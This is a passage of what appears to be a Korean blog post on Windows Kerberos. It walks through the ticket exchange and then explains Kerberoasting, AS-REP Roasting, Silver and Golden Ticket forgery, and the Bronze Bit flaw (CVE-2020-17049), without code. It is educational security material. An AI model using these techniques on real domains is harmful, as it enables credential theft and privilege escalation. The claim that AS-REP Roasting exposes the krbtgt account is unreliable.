&#xC138;&#xC158;&#xD0A4;(&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;-TGS)</strong> &#xB97C; &#xBC1C;&#xAE09;&#xD569;&#xB2C8;&#xB2E4;. &#xC138;&#xC158;&#xD0A4;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xC758; NTLM hash&#xB85C; &#xC554;&#xD638;&#xD654;&#xB418;&#xBA70; TGT&#xB294; <strong>KDC&#xC758; &#xB9C8;&#xC2A4;&#xD130; &#xD0A4; (krbtgt &#xACC4;&#xC815;&#xC758; NTLM hash)</strong> &#xB85C; &#xC554;&#xD638;&#xD654; &#xB418;&#xC5B4; &#xC788;&#xAE30;&#xC5D0; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB294; TGT&#xB97C; &#xBCF5;&#xD638;&#xD654;&#xD560; &#xC218;&#xB294; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>3) TGS-REQ</strong> </p><p>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xC11C;&#xBE44;&#xC2A4; &#xC11C;&#xBC84;&#xC5D0; &#xC811;&#xADFC;&#xC774; &#xD544;&#xC694;&#xD560; &#xB54C; TGT &#xB97C; TGS-REQ &#xBA54;&#xC2DC;&#xC9C0;&#xC5D0; &#xC2E4;&#xC5B4;&#xC11C; KDC&#xC758; TGS &#xC5D0; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;. &#xC774; &#xC694;&#xCCAD;&#xC5D0;&#xB294; &#xB300;&#xC0C1; &#xC11C;&#xBE44;&#xC2A4;&#xC758; SPN &#xACFC; &#xC55E;&#xC11C; &#xBC1C;&#xAE09;&#xB41C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;-TGS&#xAC04; &#xC138;&#xC158;&#xD0A4;&#xB3C4; &#xD3EC;&#xD568;&#xD569;&#xB2C8;&#xB2E4;.</p><p><strong>4) TGS-REP</strong> </p><p>KDC&#xB294; TGS-REQ&#xB97C; &#xBC1B;&#xC544;&#xC11C; TGT&#xAC00; &#xC720;&#xD6A8;&#xD55C;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. TGT &#xB294; KDC &#xC758; &#xB9C8;&#xC2A4;&#xD130;&#xD0A4;&#xB85C; &#xC554;&#xD638;&#xD654; &#xB418;&#xC5B4; &#xC788;&#xAE30;&#xC5D0; KDC&#xAC00; &#xBCF5;&#xD638;&#xD654; &#xD558;&#xC5EC; &#xAC80;&#xC99D;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xADF8;&#xB9AC;&#xACE0; &#xD574;&#xB2F9; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC694;&#xCCAD;&#xD55C; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC774; &#xD655;&#xC778;&#xD558;&#xACE0; &#xBB38;&#xC81C;&#xAC00; &#xC5C6;&#xC73C;&#xBA74; TGS-REP &#xC751;&#xB2F5;&#xC744; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0;&#xAC8C; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;. </p><p>&#xC5EC;&#xAE30;&#xC5D0;&#xB294; <strong>&#xC138;&#xC158; &#xD0A4;</strong>(<strong>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;-&#xC11C;&#xBE44;&#xC2A4; &#xC11C;&#xBC84;</strong>)&#xC640; <strong>&#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;(ST)</strong>&#xC774; &#xD3EC;&#xD568;&#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC740; &#xD574;&#xB2F9; &#xC11C;&#xBE44;&#xC2A4; &#xACC4;&#xC815;&#xC758; &#xBE44;&#xBC00; &#xD0A4;(&#xC11C;&#xBE44;&#xC2A4; &#xACC4;&#xC815;&#xC758; NTLM hash)&#xB85C; &#xC554;&#xD638;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBBC0;&#xB85C; <strong>&#xC11C;&#xBE44;&#xC2A4;&#xB9CC;</strong> &#xBCF5;&#xD638;&#xD654; &#xD558;&#xC5EC; &#xC5F4;&#xB78C;&#xD560; &#xC218; &#xC788;&#xACE0; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB294; &#xB0B4;&#xC6A9;&#xC744; &#xC54C; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB294; &#xC774; ST&#xB97C; &#xBC1B;&#xC544;&#xB450;&#xC5C8;&#xB2E4;&#xAC00; &#xC2E4;&#xC81C; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xC811;&#xC18D;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p><strong>5) AP-REQ</strong></p><p>&#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB294; &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC744; &#xB4E4;&#xACE0; AP-REQ &#xB97C; &#xB300;&#xC0C1; &#xC11C;&#xBC84;(&#xC11C;&#xBE44;&#xC2A4;)&#xC5D0; &#xC81C;&#xC2DC;&#xD558;&#xC5EC; &#xC811;&#xC18D;&#xC744; &#xC2DC;&#xB3C4;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB294; &#xC790;&#xC2E0;&#xC758; &#xC2E0;&#xC6D0;&#xC744; &#xC99D;&#xBA85;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC55E;&#xC11C; &#xBC1B;&#xC740; &#xC11C;&#xBE44;&#xC2A4; &#xC138;&#xC158; &#xD0A4;&#xB85C; &#xC554;&#xD638;&#xD654;&#xD55C; &#xC778;&#xC99D;&#xC790;(Authenticator, &#xD0C0;&#xC784;&#xC2A4;&#xD0EC;&#xD504; &#xB4F1;)&#xB3C4; &#xD568;&#xAED8; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;.</p><p>&#xC11C;&#xBC84;&#xB294; &#xB3C4;&#xBA54;&#xC778; &#xCEE8;&#xD2B8;&#xB864;&#xB7EC;&#xC5D0; KERB_VERIFY_PAC &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC804;&#xC1A1;&#xD558;&#xC5EC; &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13; &#xB0B4; PAC &#xC758; &#xC11C;&#xBA85; &#xAC80;&#xC99D;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. &#xC774; PAC&#xB294; KDC&#xC758; &#xC11C;&#xBA85;&#xC73C;&#xB85C; &#xBCF4;&#xD638;&#xB418;&#xBA70;, &#xC11C;&#xBE44;&#xC2A4;&#xB294; &#xD2F0;&#xCF13;&#xC744; &#xAC80;&#xC99D;&#xD560; &#xB54C; PAC&#xC758; &#xBB34;&#xACB0;&#xC131;&#xC744; &#xD655;&#xC778;&#xD568;&#xC73C;&#xB85C;&#xC368; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xB3C4;&#xBA54;&#xC778; &#xB0B4; &#xAD8C;&#xD55C;&#xC744; &#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/04/21/mungsul/NTLM_Part2/ko/3.png" alt></p><p><strong>6) AP-REP</strong> </p><p>&#xC11C;&#xBE44;&#xC2A4; &#xC11C;&#xBC84;&#xC5D0;&#xC11C;&#xB294; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xC81C;&#xC2DC;&#xD55C; &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC758; PAC&#xB97C; &#xD655;&#xC778;&#xD558;&#xACE0; &#xAC80;&#xC99D;&#xC774; &#xC131;&#xACF5;&#xD558;&#xBA74; &#xC11C;&#xBC84;&#xB294; AP-REP &#xBA54;&#xC2DC;&#xC9C0;&#xB85C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0;&#xAC8C; &#xC751;&#xB2F5;&#xC744; &#xBCF4;&#xB0B4; &#xC138;&#xC158; &#xD0A4; &#xD611;&#xC0C1;&#xC744; &#xC644;&#xB8CC;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB294; &#xD574;&#xB2F9; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xC811;&#xADFC;&#xC774; &#xD5C8;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. </p><hr><p>&#xC124;&#xBA85;&#xC5D0;&#xC11C; &#xC54C; &#xC218; &#xC788;&#xB4EF;&#xC774;, Windows &#xC5D0;&#xC11C;&#xC758; Kerberos &#xC778;&#xC99D;&#xC740; &#xC11C;&#xB85C; &#xACF5;&#xC720;&#xB418;&#xB294; &#xC554;&#xD638;&#xD0A4;&#xAC00; &#xC0AC;&#xC6A9;&#xC790;&#xC758; NTLM hash &#xC774;&#xBA70; PAC &#xB77C;&#xACE0; &#xD558;&#xB294; &#xAD8C;&#xD55C; &#xC815;&#xBCF4;&#xAC00; &#xD2F0;&#xCF13;&#xC5D0; &#xB2F4;&#xACA8;&#xC788;&#xACE0; PAC&#xB294; KDC&#xAC00; &#xC11C;&#xBA85;&#xD558;&#xC5EC; &#xBB34;&#xACB0;&#xC131;&#xC744; &#xD655;&#xBCF4;&#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="Kerberos-&#xAD00;&#xB828;-&#xACF5;&#xACA9;"><a href="#Kerberos-&#xAD00;&#xB828;-&#xACF5;&#xACA9;" class="headerlink" title="Kerberos &#xAD00;&#xB828; &#xACF5;&#xACA9;"></a>Kerberos &#xAD00;&#xB828; &#xACF5;&#xACA9;</h1><p>Kerberos &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xC790;&#xCCB4;&#xB294; &#xC548;&#xC804;&#xD558;&#xAC8C; &#xC124;&#xACC4;&#xB418;&#xC5C8;&#xC73C;&#xB098;, &#xAD6C;&#xD604;&#xC0C1; &#xC124;&#xC815;&#xC774;&#xB098; &#xC6B4;&#xC601; &#xD658;&#xACBD;&#xC5D0; &#xB530;&#xB77C; &#xB2E4;&#xC591;&#xD55C; &#xACF5;&#xACA9; &#xAE30;&#xBC95;&#xC774; &#xC5F0;&#xAD6C;&#xB418;&#xC5B4; &#xC654;&#xC2B5;&#xB2C8;&#xB2E4;. Windows Kerberos &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC8FC;&#xB85C; &#xB2E4;&#xB904;&#xC9C0;&#xB294; &#xACF5;&#xACA9; &#xAE30;&#xBC95;&#xB4E4;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC54C;&#xC544;&#xBD05;&#xC2DC;&#xB2E4;.</p><h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h2><p>Kerberoasting &#xC740; &#xD569;&#xBC95;&#xC801;&#xC778; &#xB3C4;&#xBA54;&#xC778; &#xC0AC;&#xC6A9;&#xC790; &#xACC4;&#xC815;&#xC73C;&#xB85C; <strong>&#xC11C;&#xBE44;&#xC2A4; &#xACC4;&#xC815;</strong>&#xC758; Kerberos &#xD2F0;&#xCF13;&#xC744; &#xC694;&#xCCAD;&#xD55C; &#xD6C4;, &#xD2F0;&#xCF13;&#xC5D0; &#xD3EC;&#xD568;&#xB41C; &#xC554;&#xD638;&#xD654;&#xB41C; &#xC815;&#xBCF4;&#xB97C; &#xD06C;&#xB799;&#xD558;&#xC5EC; &#xC11C;&#xBE44;&#xC2A4; &#xACC4;&#xC815;&#xC758; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xD0C8;&#xCDE8;&#xD558;&#xB294; &#xACF5;&#xACA9; &#xAE30;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;.</p><p>AD &#xB3C4;&#xBA54;&#xC778; &#xC548;&#xC5D0; &#xC788;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xB77C;&#xBA74; SPN &#xC18D;&#xC131;&#xC774; &#xC788;&#xB294; &#xACC4;&#xC815;&#xC5D0; &#xB300;&#xD574;&#xC11C; TGS-REQ &#xB97C; &#xD1B5;&#xD574; &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC744; &#xC694;&#xCCAD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  &#xC989;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xB3C4;&#xBA54;&#xC778; &#xB0B4;&#xB85C; &#xC774;&#xBBF8; &#xCE68;&#xD22C;&#xD55C; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xAE30;&#xBC95;&#xC774;&#xC8E0;.</p><p>&#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC740; NTLM hash &#xB85C; &#xC554;&#xD638;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD06C;&#xB799;&#xC774; &#xC131;&#xACF5;&#xD55C;&#xB2E4;&#xBA74; NTLM hash &#xB97C; &#xC54C;&#xC544;&#xB0B4;&#xB294; &#xAC83;&#xC774;&#xBA70; &#xC774; hash &#xB97C; &#xC5BB;&#xC5C8;&#xB2E4;&#xB294; &#xAC83;&#xC740; Windows &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xC5BB;&#xC5B4;&#xB0B8; &#xAC83;&#xACFC; &#xB2E4;&#xB984;&#xC774; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h2><p><strong>AS-REP Roasting</strong>&#xC740; Kerberoasting&#xACFC; &#xC720;&#xC0AC;&#xD558;&#xC9C0;&#xB9CC;, <strong>Kerberos Pre-Authentication&#xC774; &#xBE44;&#xD65C;&#xC131;&#xD654;</strong>&#xB41C; &#xC0AC;&#xC6A9;&#xC790;&#xB97C; &#xD45C;&#xC801;&#xC73C;&#xB85C; &#xD558;&#xB294; &#xAE30;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC0AC;&#xC804; &#xC778;&#xC99D;&#xC740; TGT &#xAC00; &#xBC1C;&#xAE09;&#xB418;&#xAE30; &#xC804;&#xC5D0; &#xC0AC;&#xC804;&#xC5D0; &#xACF5;&#xC720;&#xB41C; key &#xB97C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xC54C;&#xACE0; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC785;&#xB2C8;&#xB2E4;.</p><p>AD &#xACC4;&#xC815; &#xC18D;&#xC131; &#xC911; &#x201C;Do not require Kerberos pre authentication&#x201D; &#xC774;&#xB77C;&#xB294; &#xC635;&#xC158;&#xC774; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA74; &#xC0AC;&#xC804; &#xC778;&#xC99D; &#xC5C6;&#xC774; TGT &#xB97C; &#xBC1C;&#xAE09;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB2C8;&#xAE4C;, &#xD328;&#xC2A4;&#xC6CC;&#xB4DC; &#xC5C6;&#xC774;&#xB3C4; TGT&#xB97C; &#xBC1C;&#xAE09;&#xBC1B;&#xC744; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xB9D0;&#xC785;&#xB2C8;&#xB2E4;.</p><p>TGT &#xB294; KDC&#xC758; &#xB9C8;&#xC2A4;&#xD130;&#xD0A4; &#xC989;, krbtgt &#xACC4;&#xC815;&#xC758; NTLM hash &#xB85C; &#xC554;&#xD638;&#xD654;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; TGT &#xD06C;&#xB799;&#xC5D0; &#xC131;&#xACF5;&#xD55C;&#xB2E4;&#xBA74; krbtgt &#xACC4;&#xC815;&#xC758; &#xAD8C;&#xD55C;&#xC744; &#xD0C8;&#xCDE8;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB418;&#xB294; &#xC148;&#xC785;&#xB2C8;&#xB2E4;. </p><h2 id="Silver-Ticket"><a href="#Silver-Ticket" class="headerlink" title="Silver Ticket"></a>Silver Ticket</h2><p>&#xB9CC;&#xC57D; &#xD2B9;&#xC815; &#xC11C;&#xBE44;&#xC2A4; &#xACC4;&#xC815;&#xC758; NTLM hash &#xB97C; &#xC5BB;&#xC5B4;&#xB0B8; &#xC0C1;&#xD669;&#xC774;&#xB77C;&#xBA74; &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD574; PAC&#xB97C; &#xC870;&#xC791;&#xD55C; &#xB2E4;&#xB978; &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4;&#xB0BC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC740; &#xC6D0;&#xB798; TGS &#xC5D0;&#xC11C; &#xBC1C;&#xAE09;&#xC744; &#xD574;&#xC8FC;&#xC9C0;&#xB9CC; TGS &#xB97C; &#xD1B5;&#xD558;&#xC9C0; &#xC54A;&#xACE0;&#xB3C4; &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13; &#xC0DD;&#xC131;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13; &#xB0B4; PAC &#xB294; &#xC11C;&#xBE44;&#xC2A4; &#xACC4;&#xC815; &#xBE44;&#xBC00;&#xD0A4;&#xC640; krbtgt &#xACC4;&#xC815; &#xBE44;&#xBC00;&#xD0A4; 2&#xAC1C;&#xB85C; &#xC11C;&#xBA85;&#xC774; &#xB418;&#xB294;&#xB370;, &#xC11C;&#xBE44;&#xC2A4; &#xACC4;&#xC815; &#xBE44;&#xBC00;&#xD0A4; &#xC11C;&#xBA85;&#xB9CC; &#xAC80;&#xC99D;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB300;&#xD45C;&#xC801;&#xC73C;&#xB85C; SeTcbPrivilege &#xAD8C;&#xD55C;&#xC774; &#xC788;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xADF8;&#xB7EC;&#xD55C;&#xB370;&#xC694;. &#xC774; &#xAD8C;&#xD55C;&#xC774; &#xC788;&#xB294; &#xACC4;&#xC815;&#xC740; &#xC11C;&#xBE44;&#xC2A4; &#xACC4;&#xC815; &#xBE44;&#xBC00;&#xD0A4; &#xC11C;&#xBA85;&#xB9CC; &#xAC80;&#xC99D;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; Silver Ticket &#xC758; &#xB300;&#xC0C1;&#xC774; &#xB41C;&#xB2E4;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden Ticket"></a>Golden Ticket</h2><p>krbtgt &#xACC4;&#xC815;&#xC758; NTLM hash &#xB97C; &#xC5BB;&#xC5B4;&#xB0C8;&#xB2E4;&#xBA74; TGT &#xC0DD;&#xC131;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; TGT &#xC5D0;&#xB3C4; PAC &#xAC00; &#xD3EC;&#xD568;&#xB418;&#xB294;&#xB370;&#xC694;. &#xC55E;&#xC11C; Silver Ticket &#xC740; &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC758; PAC&#xB97C; &#xC870;&#xC791;&#xD588;&#xB2E4;&#xBA74; Golden Ticket &#xC740; TGT &#xC758; PAC&#xB97C; &#xC870;&#xC791;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC870;&#xC791;&#xB41C; PAC&#xB97C; &#xAC00;&#xC9C4; TGT&#xAC00; TGS &#xC5D0; &#xC804;&#xB2EC;&#xC774; &#xB418;&#xBA74; &#xD574;&#xB2F9; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC774; &#xBC1C;&#xAE09;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xB3C4;&#xBA54;&#xC778; &#xC5B4;&#xB4DC;&#xBBFC; &#xB4F1; &#xB354; &#xB192;&#xC740; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC0C1;&#xC2B9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Kerberos-&#xAD00;&#xB828;-&#xCDE8;&#xC57D;&#xC810;"><a href="#Kerberos-&#xAD00;&#xB828;-&#xCDE8;&#xC57D;&#xC810;" class="headerlink" title="Kerberos &#xAD00;&#xB828; &#xCDE8;&#xC57D;&#xC810;"></a>Kerberos &#xAD00;&#xB828; &#xCDE8;&#xC57D;&#xC810;</h1><p>Kerberos &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC740; &#xB0B4;&#xC6A9;&#xC774; &#xBC29;&#xB300;&#xD558;&#xACE0; Windows &#xC5D0;&#xC11C; &#xAD6C;&#xD604;&#xD55C; &#xAC01;&#xC885; &#xAD00;&#xB828; &#xAE30;&#xB2A5;&#xB4E4;&#xC744; &#xBAA8;&#xB450; &#xC18C;&#xAC1C;&#xD558;&#xB294; &#xAC83;&#xC740; &#xC5B4;&#xB835;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30;&#xC5D0; CVE &#xBA87; &#xC885;&#xC744; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74;&#xC11C; &#xC5B4;&#xB5A4; &#xC138;&#xBD80; &#xC0AC;&#xD56D;&#xB4E4;&#xC774; &#xC788;&#xB294;&#xC9C0;&#xC640; &#xBC1C;&#xC0DD;&#xD588;&#xB358; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBCF4;&#xB294; &#xC2DC;&#xAC04;&#xC744; &#xAC16;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="CVE-2020-17049"><a href="#CVE-2020-17049" class="headerlink" title="CVE-2020-17049"></a>CVE-2020-17049</h2><p>CVE-2020-17049&#xB294; Kerberos Delegation &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xBCF4;&#xC548; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C;, &#x201C;Bronze Bit&#x201D; &#xACF5;&#xACA9;&#xC73C;&#xB85C; &#xC54C;&#xB824;&#xC838; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>Delegtation &#xC740; &#xC9C1;&#xC5ED;&#xD558;&#xBA74; &#xC704;&#xC784;&#xC778;&#xB370;&#xC694;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;&#xC11C; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC6F9; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0; &#xC778;&#xC99D;&#xC744; &#xD558;&#xACE0;, &#xC6F9; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xC0AC;&#xC6A9;&#xC790; &#xAD8C;&#xD55C;&#xC5D0; &#xB530;&#xB77C; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xC5D0; &#xC811;&#xADFC;&#xD574;&#xC57C;&#xD560; &#xB54C;&#xAC00; &#xC788;&#xB2E4;&#xACE0; &#xD569;&#xC2DC;&#xB2E4;. &#xC774; &#xB54C; &#xC6F9; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xC0AC;&#xC6A9;&#xC790; &#xAD8C;&#xD55C;&#xC744; &#x201C;&#xC704;&#xC784;&#x201D; &#xBC1B;&#xC544;&#xC11C; &#xC694;&#xCCAD;&#xC744; &#xD574;&#xC57C;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774;&#xB97C; &#xC9C0;&#xC6D0;&#xD558;&#xAE30; &#xC704;&#xD55C; Kerberos Delegation &#xC774; &#xC5EC;&#xB7EC; &#xC885; &#xAD6C;&#xD604;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. (Unconstrained Delegation, Constrained Delegation, &#xC704;&#xC784; &#xD558;&#xC9C0; &#xC54A;&#xC74C; &#xB4F1;) </p><p>&#xC704;&#xC784;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xC11C;&#xBE44;&#xC2A4;&#xB4E4;&#xC744; &#xC9C0;&#xC815;&#xD558;&#xB294; AllowedToDelegateTo &#xD504;&#xB85C;&#xD37C;&#xD2F0;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xD2B9;&#xC815; &#xC11C;&#xBE44;&#xC2A4;A&#xAC00; &#xB2E4;&#xB978; &#xC11C;&#xBE44;&#xC2A4;B&#xC5D0; &#xC704;&#xC784;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC815;&#xBCF4;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xAC83;&#xC774;&#xC8E0;.</p><p>&#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC5D0; &#xC788;&#xB294; Forwardable Flag &#xB294; &#xC774; &#xD2F0;&#xCF13;&#xC774; Relay &#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xB290;&#xB0D0;&#xB97C; &#xD45C;&#xAE30;&#xD558;&#xB294; &#xBE44;&#xD2B8;&#xC778;&#xB370;&#xC694;. Forwardable &#xC774; 1&#xC774;&#xB77C;&#xBA74; &#xAD8C;&#xD55C; &#xC704;&#xC784;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xB294; &#xB9D0;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; &#xC55E;&#xC11C; Kerberos Delegation &#xC635;&#xC158; &#xC911; &#xC704;&#xC784; &#xD558;&#xC9C0; &#xC54A;&#xC74C; &#xC635;&#xC158;&#xC774;&#xB098;, AllowedToDelegateTo &#xB85C; &#xC815;&#xC758;&#xAC00; &#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xC744; &#xACBD;&#xC6B0; Forwardable&#xC774; 0&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7F0;&#xB370; Forwardable bit &#xB294; KDC&#xC758; &#xC11C;&#xBA85;, &#xC11C;&#xBE44;&#xC2A4;&#xC758; &#xC11C;&#xBA85; &#xB4F1;&#xC73C;&#xB85C; &#xBCF4;&#xD638;&#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xC544;&#xC11C; &#xBCC0;&#xC870;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xCBE4; &#xC624;&#xBA74; &#xC774; CVE&#xAC00; &#xC5B4;&#xB5A4; &#xCDE8;&#xC57D;&#xC810;&#xC778;&#xC9C0; &#xAC10;&#xC774; &#xC624;&#xC2DC;&#xB098;&#xC694;?</p><p>&#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC5D0; &#xC788;&#xB294;Forwardable Flag &#xB97C; &#xC870;&#xC791;&#xD558;&#xC5EC; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xBCF4;&#xB0B4;&#xBA74; &#xADF8; &#xC11C;&#xBE44;&#xC2A4;&#xAC00; &#xAD8C;&#xD55C; &#xC704;&#xC784;&#xC744; &#xD558;&#xACE0; &#xC788;&#xC9C0; &#xC54A;&#xB354;&#xB77C;&#xB3C4; &#xAC15;&#xC81C;&#xB85C; &#xAD8C;&#xD55C; &#xC704;&#xC784;&#xC744; &#xD558;&#xAC8C; &#xB418;&#xC5B4; &#xAD8C;&#xD55C;&#xC744; &#xD0C8;&#xCDE8;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p>Windows &#xC5D0;&#xC11C;&#xB294; Kerberos Contrained Delegation (MS-SFU) &#xB294; S4U2proxy &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xB85C; &#xAD8C;&#xD55C; &#xC704;&#xC784;&#xC744; 